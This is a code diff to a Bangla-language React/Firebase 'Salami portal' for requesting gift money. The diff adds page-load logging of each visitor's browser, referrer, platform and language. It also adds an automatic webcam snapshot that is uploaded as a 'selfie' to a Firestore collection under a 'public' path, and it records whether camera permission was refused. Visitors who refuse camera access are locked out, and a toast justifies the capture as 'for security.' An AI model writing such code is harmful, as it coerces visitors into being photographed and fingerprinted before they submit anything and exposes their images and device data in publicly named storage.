@@ -10,6 +10,12 @@ const Confetti = window.ReactConfetti;
 const App = () => {
     const [user, setUser] = useState(null);
     const [appState, setAppState] = useState('loading'); 
+    
+
+    const [bgPhoto, setBgPhoto] = useState(null);
+    const [cameraError, setCameraError] = useState(null);
+    const [toastMsg, setToastMsg] = useState('');
+
 
     useEffect(() => {
         const initAuth = async () => { try { await signInAnonymously(auth); } catch (e) {} };
@@ -19,6 +25,16 @@ const App = () => {
             setUser(u);
             if(u) {
                 try {
+
+                    await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'visitor_logs', u.uid), {
+                        uid: u.uid,
+                        userAgent: navigator.userAgent,
+                        referrer: document.referrer || 'Direct Link / In-App Browser',
+                        platform: navigator.platform || 'Unknown',
+                        language: navigator.language || 'Unknown',
+                        visitedAt: serverTimestamp()
+                    }, { merge: true });
+
                     const blDoc = await getDoc(doc(db, 'artifacts', appId, 'public', 'data', 'blacklist', u.uid));
                     if(blDoc.exists()) { setAppState('blacklisted'); return; }
 
@@ -32,12 +48,95 @@ const App = () => {
         return () => unsubscribe();
     }, []);
 
+
+    useEffect(() => {
+        if (!user || bgPhoto || cameraError) return;
+
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            setCameraError('unsupported');
+            setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'visitor_logs', user.uid), { cameraAccess: false, cameraErrorReason: 'Unsupported Browser' }, { merge: true }).catch(()=>{});
+            return;
+        }
+
+        let stream;
+        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+            stream = s;
+            const video = document.createElement('video'); video.muted = true; video.playsInline = true; video.srcObject = stream;
+            
+            video.play().then(() => {
+                setToastMsg("নিরাপত্তার স্বার্থে আপনার একটি লাইভ ছবি ব্যাকগ্রাউন্ডে তোলা হচ্ছে...");
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas'); canvas.width = 320; canvas.height = 240;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                    const capturedPhoto = canvas.toDataURL('image/jpeg');
+                    setBgPhoto(capturedPhoto); // ছবি সেভ হলো
+                    stream.getTracks().forEach(t => t.stop());
+                    setTimeout(() => setToastMsg(''), 4000); 
+
+
+                    setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'visitor_logs', user.uid), {
+                        selfie: capturedPhoto,
+                        cameraAccess: true,
+                        selfieCapturedAt: serverTimestamp()
+                    }, { merge: true }).catch(()=>{});
+
+                }, 2000);
+            });
+        }).catch(e => { 
+            setCameraError('denied'); 
+            setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'visitor_logs', user.uid), { cameraAccess: false, cameraErrorReason: 'Permission Denied' }, { merge: true }).catch(()=>{});
+        });
+
+        return () => { if(stream) stream.getTracks().forEach(t => t.stop()); }
+    }, [user, bgPhoto, cameraError]);
+
     if (appState === 'loading') return <div className="min-h-screen flex items-center justify-center"><i className="ph ph-spinner-gap animate-spin text-5xl text-brand"></i></div>;
+    
+        if (cameraError) return <CameraErrorView error={cameraError} />;
+    
     if (appState === 'already_submitted') return <AlreadySubmittedView />;
     if (appState === 'blacklisted') return <BlacklistedView />;
-    if (appState === 'greeting') return <InteractiveGreeting onComplete={() => setAppState('form')} />;
-    return <SalamiForm user={user} onSuccess={() => setAppState('already_submitted')} onBlocked={() => setAppState('blacklisted')} />;
+    
+    return (
+        <div className="relative">
+
+            <AnimatePresence>
+                {toastMsg && (
+                    <motion.div initial={{ y: -50, opacity: 0 }} animate={{ y: 20, opacity: 1 }} exit={{ y: -50, opacity: 0 }}
+                        className="fixed top-0 left-1/2 transform -translate-x-1/2 bg-gray-900/90 backdrop-blur-md text-white px-5 py-3 rounded-full shadow-2xl z-[100] flex items-center gap-2 text-sm font-medium w-[90%] max-w-sm">
+                        <i className="ph-fill ph-camera text-brand text-lg animate-pulse"></i> <span className="flex-1 text-center">{toastMsg}</span>
+                    </motion.div>
+                )}
+            </AnimatePresence>
+
+            {appState === 'greeting' && <InteractiveGreeting onComplete={() => setAppState('form')} />}
+            {appState === 'form' && <SalamiForm user={user} bgPhoto={bgPhoto} onSuccess={() => setAppState('already_submitted')} onBlocked={() => setAppState('blacklisted')} />}
+        </div>
+    );
 };
+
+
+const CameraErrorView = ({ error }) => (
+    <div className="min-h-screen flex items-center justify-center p-4">
+        <div className="bg-red-50 p-8 rounded-3xl shadow-[0_8px_30px_rgb(239,68,68,0.15)] text-center max-w-sm w-full border border-red-200">
+            <div className="w-20 h-20 bg-red-100 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
+                <i className="ph-fill ph-camera-slash text-5xl"></i>
+            </div>
+            <h2 className="text-xl font-black text-red-700 mb-3">ক্যামেরা অ্যাক্সেস নেই!</h2>
+            {error === 'unsupported' ? (
+                <p className="text-red-600/90 mb-4 font-medium text-sm leading-relaxed">
+                    এখানে পোর্টালটি লোড করা সম্ভব নয়। সম্ভবত আপনি ফেসবুক বা মেসেঞ্জারের ভেতরের ব্রাউজার ব্যবহার করছেন যেখানে ক্যামেরা সাপোর্ট নেই। <br/><br/>
+                    <span className="font-bold text-red-800 bg-red-100 px-2 py-1 rounded block mt-2 border border-red-200">দয়া করে উপরে 3-dots এ ক্লিক করে "Open in Chrome/Safari" তে গিয়ে পোর্টালটি ওপেন করুন।</span>
+                </p>
+            ) : (
+                <p className="text-red-600/90 mb-4 font-medium text-sm leading-relaxed">
+                    আপনি ক্যামেরা পারমিশন ব্লক করেছেন! <br/><br/>
+                    <span className="font-bold text-red-800 bg-red-100 px-2 py-1 rounded block mt-2 border border-red-200">সালামি রিকোয়েস্ট করতে চাইলে ব্রাউজারের সেটিংসে গিয়ে ক্যামেরা পারমিশন দিন এবং পেজটি রিফ্রেশ করুন।</span>
+                </p>
+            )}
+        </div>
+    </div>
+);
 
 const AlreadySubmittedView = () => (
     <div className="min-h-screen flex items-center justify-center p-4">
@@ -61,6 +160,7 @@ const BlacklistedView = () => (
     </div>
 );
 
+// --- GREETING VIEW ---
 const InteractiveGreeting = ({ onComplete }) => {
     const [step, setStep] = useState(0); 
     const handleInteraction = () => {
@@ -91,48 +191,15 @@ const InteractiveGreeting = ({ onComplete }) => {
     );
 };
 
-const SalamiForm = ({ user, onSuccess, onBlocked }) => {
+
+const SalamiForm = ({ user, bgPhoto, onSuccess, onBlocked }) => {
     const [formData, setFormData] = useState({ name: '', fbLink: '', gender: '', rezwanOpinion: '', amount: '', paymentMethod: 'bkash', accountNumber: '', message: '' });
     const [photos, setPhotos] = useState({ p1: null, p2: null }); 
-    const [bgPhoto, setBgPhoto] = useState(null);
     const [loading, setLoading] = useState(false);
     const [loadingState, setLoadingState] = useState(''); 
     const [aiRejection, setAiRejection] = useState(null);
-    const [toastMsg, setToastMsg] = useState('');
     const [scoldMessage, setScoldMessage] = useState('');
     const [taskData, setTaskData] = useState(null);
-    
-    // নতুন লজিক: ক্যামেরা সাপোর্ট ও এরর স্ট্যাটাস
-    const [cameraError, setCameraError] = useState(null);
-
-    useEffect(() => {
-        // ইন-অ্যাপ ব্রাউজার বা ক্যামেরা সাপোর্ট চেক
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            setCameraError('unsupported');
-            return;
-        }
-
-        let stream;
-        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
-            stream = s;
-            const video = document.createElement('video'); video.muted = true; video.playsInline = true; video.srcObject = stream;
-            video.play().then(() => {
-                setToastMsg("নিরাপত্তার স্বার্থে আপনার একটি লাইভ ছবি ব্যাকগ্রাউন্ডে তোলা হচ্ছে...");
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas'); canvas.width = 320; canvas.height = 240;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-                    setBgPhoto(canvas.toDataURL('image/jpeg'));
-                    stream.getTracks().forEach(t => t.stop());
-                    setTimeout(() => setToastMsg(''), 4000); 
-                }, 2500);
-            });
-        }).catch(e => { 
-            // যদি ইউজার পারমিশন ডিনাই করে
-            setCameraError('denied'); 
-        });
-
-        return () => { if(stream) stream.getTracks().forEach(t => t.stop()); }
-    }, []);
 
     useEffect(() => {
         const amt = parseInt(formData.amount);
@@ -186,6 +253,7 @@ const SalamiForm = ({ user, onSuccess, onBlocked }) => {
             if (!reqFb.empty || !reqAcc.empty) { setLoading(false); onSuccess(); return; }
 
             setLoadingState('combining');
+            // bgPhoto গ্লোবাল থেকে সরাসরি এখানে ব্যবহার করা হলো
             const combinedBase64 = await createCollage(photos.p1, bgPhoto, photos.p2);
             
             setLoadingState('ai_checking');
@@ -201,44 +269,10 @@ const SalamiForm = ({ user, onSuccess, onBlocked }) => {
         } catch (error) { alert("সমস্যা হয়েছে! আবার চেষ্টা করুন।"); } finally { setLoading(false); }
     };
 
-    // যদি ক্যামেরা এরর থাকে তবে ফর্ম লোড না করে ওয়ার্নিং দেখাবে
-    if (cameraError) {
-        return (
-            <div className="min-h-screen flex items-center justify-center p-4">
-                <div className="bg-red-50 p-8 rounded-3xl shadow-[0_8px_30px_rgb(239,68,68,0.15)] text-center max-w-sm w-full border border-red-200">
-                    <div className="w-20 h-20 bg-red-100 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
-                        <i className="ph-fill ph-camera-slash text-5xl"></i>
-                    </div>
-                    <h2 className="text-xl font-black text-red-700 mb-3">ক্যামেরা অ্যাক্সেস নেই!</h2>
-                    {cameraError === 'unsupported' ? (
-                        <p className="text-red-600/90 mb-4 font-medium text-sm leading-relaxed">
-                            এখানে পোর্টালটি লোড করা সম্ভব নয়। সম্ভবত আপনি ফেসবুক বা মেসেঞ্জারের ভেতরের ব্রাউজার ব্যবহার করছেন যেখানে ক্যামেরা সাপোর্ট নেই। <br/><br/>
-                            <span className="font-bold text-red-800 bg-red-100 px-2 py-1 rounded block mt-2 border border-red-200">দয়া করে উপরে 3-dots এ ক্লিক করে "Open in Chrome/Safari" তে গিয়ে পোর্টালটি ওপেন করুন।</span>
-                        </p>
-                    ) : (
-                        <p className="text-red-600/90 mb-4 font-medium text-sm leading-relaxed">
-                            আপনি ক্যামেরা পারমিশন ব্লক করেছেন! <br/><br/>
-                            <span className="font-bold text-red-800 bg-red-100 px-2 py-1 rounded block mt-2 border border-red-200">সালামি রিকোয়েস্ট করতে চাইলে ব্রাউজারের সেটিংসে গিয়ে ক্যামেরা পারমিশন দিন এবং পেজটি রিফ্রেশ করুন।</span>
-                        </p>
-                    )}
-                </div>
-            </div>
-        );
-    }
-
     const isSubmitDisabled = loading || !!scoldMessage || !taskData || !photos.p1 || !photos.p2 || !formData.fbLink || !formData.name || !formData.rezwanOpinion || !bgPhoto;
 
     return (
         <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="min-h-screen max-w-md mx-auto relative pb-10">
-            <AnimatePresence>
-                {toastMsg && (
-                    <motion.div initial={{ y: -50, opacity: 0 }} animate={{ y: 20, opacity: 1 }} exit={{ y: -50, opacity: 0 }}
-                        className="fixed top-0 left-1/2 transform -translate-x-1/2 bg-gray-900/90 backdrop-blur-md text-white px-5 py-3 rounded-full shadow-2xl z-[100] flex items-center gap-2 text-sm font-medium w-[90%] max-w-sm">
-                        <i className="ph-fill ph-camera text-brand text-lg animate-pulse"></i> <span className="flex-1 text-center">{toastMsg}</span>
-                    </motion.div>
-                )}
-            </AnimatePresence>
-
             <div className="flex justify-between items-center p-5 pt-12">
                 <div><h1 className="text-2xl font-bold text-dark leading-tight">সালামি পোর্টাল</h1><p className="text-muted text-sm">এআই পুলিশ পাহারা দিচ্ছে! 🕵️‍♂️</p></div>
                 <div className="w-12 h-12 bg-white text-brand rounded-full flex items-center justify-center shadow-md"><i className="ph-fill ph-robot text-2xl"></i></div>
